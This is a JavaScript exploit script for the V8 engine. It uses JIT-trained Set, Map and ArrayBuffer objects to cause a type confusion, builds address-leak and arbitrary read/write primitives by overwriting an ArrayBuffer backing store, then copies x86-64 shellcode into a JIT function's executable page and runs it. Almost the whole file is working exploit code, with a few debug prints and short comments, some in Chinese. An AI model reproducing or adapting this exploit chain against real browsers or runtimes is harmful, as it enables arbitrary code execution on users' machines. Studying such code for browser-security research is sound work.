var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16);
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var jit = new Function("var a = 1000000");

var a;
var b;
var c;
function Ctor_a() {
	a = new Set();
}

function Ctor_b() {
	b = new Map();
}

function Ctor_c(){
	c = new ArrayBuffer();
}

function str2obj(obj) {
	a.xyz0 = 3.4766863919152113e-308;
	a.xyz1 = 0;
	a.xyz2 = 0x8;
	a.xyz3 = obj;
}

function str2value(value){
	b.xyz0 = 3.4766863919152113e-308;
	b.xyz1 = 0;
	b.xyz2 = 0x8;
	b.xyz3 = value;

}

function hash2victim(target){
	c.xyz0 = 3.4766863919152113e-308;
	c.xyz1 = target;
}


for(let i = 0; i < 0x10000; i++){
	Ctor_a();
	Ctor_b();
	Ctor_c();
}

for(let i = 0; i < 0x10000; i++){
	str2obj();
	str2value(1.1);
	hash2victim(2.2);
}

var str = new String(null);
function addrOf(obj)
{
	Ctor_a();
	str2obj(obj);
	let addr = str.valueOf();
	let leak_addr = 0;
	for(let i = 0; i < 8; i++){
		leak_addr += addr.charCodeAt(i) * (Math.pow(0x100,i));
	}
	return leak_addr;
}

var data_buf = new ArrayBuffer(0x233);
//%DebugPrint(data_buf);
var data_buf_addr = addrOf(data_buf);
print("[+] data_buf_addr : 0x" + hex(data_buf_addr));

var backing_store = data_buf_addr + 0x20;
print("[+] backing_store : 0x" + hex(backing_store));

//%DebugPrint(jit);
var jit_addr = addrOf(jit) - 1;
print("[+] jit_addr : 0x" + hex(jit_addr));

function overwrite_backing_store(target)
{
	Ctor_a();
	str2obj(String(null));
	Ctor_b();
	str2value(i2f(backing_store-8)); // 将值字段当成HeapNumber类型
	Ctor_c();
	hash2victim(i2f(target)); //将hash字段当成HeapNumber类型
}

var data_view = new DataView(data_buf);

//----- arbitrary read
function dataview_read64(addr)
{
	overwrite_backing_store(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	overwrite_backing_store(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

var jit_rwx = dataview_read64(jit_addr + 0x38);
print("[+] jit_rwx: 0x"+hex(jit_rwx));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(jit_rwx, shellcode);

// trigger jit function to run shellcode
jit();